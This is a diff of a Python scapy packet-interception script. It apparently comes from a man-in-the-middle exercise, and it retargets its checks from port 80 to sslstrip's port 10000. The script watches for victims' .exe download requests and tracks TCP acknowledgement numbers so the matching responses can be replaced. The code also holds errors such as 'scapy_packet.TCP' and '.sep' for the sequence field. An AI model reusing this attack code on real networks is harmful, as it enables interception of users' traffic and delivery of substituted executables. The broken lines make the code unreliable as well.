@@ -25,8 +25,8 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     # Check if the packet has a layer Raw
     if scapy_packet.haslayer(scapy.Raw):
-        # Check if the packet has HTTP request
-        if scapy_packet[scapy.TCP].dport == 80:
+        # Check if the packet has HTTP request if using sslstrip then the port is 10000
+        if scapy_packet[scapy.TCP].dport == 10000:
             # Check is there is .exe request in the Raw layer section load
             if '.exe' in scapy_packet[scapy.Raw].load.decode() and "10.0.2.16" not in scapy_packet[scapy.Raw].load.decode():
                 # Print a message that there is an .exe request
@@ -34,8 +34,8 @@ def process_packet(packet):
                 # Append to the list the ack number
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                
-        # Check if the TCP layer has 80 in the sport section
-        elif scapy_packet[scapy_packet.TCP].sport == 80:
+        # Check if the TCP layer has 80 in the sport section if using sslstrip then the port is 10000
+        elif scapy_packet[scapy_packet.TCP].sport == 10000:
             # Check if the sep number is the same as the one in the ack list
             if scapy_packet[scapy_packet.TCP].sep in ack_list:
                 # Removing the ack number from the list
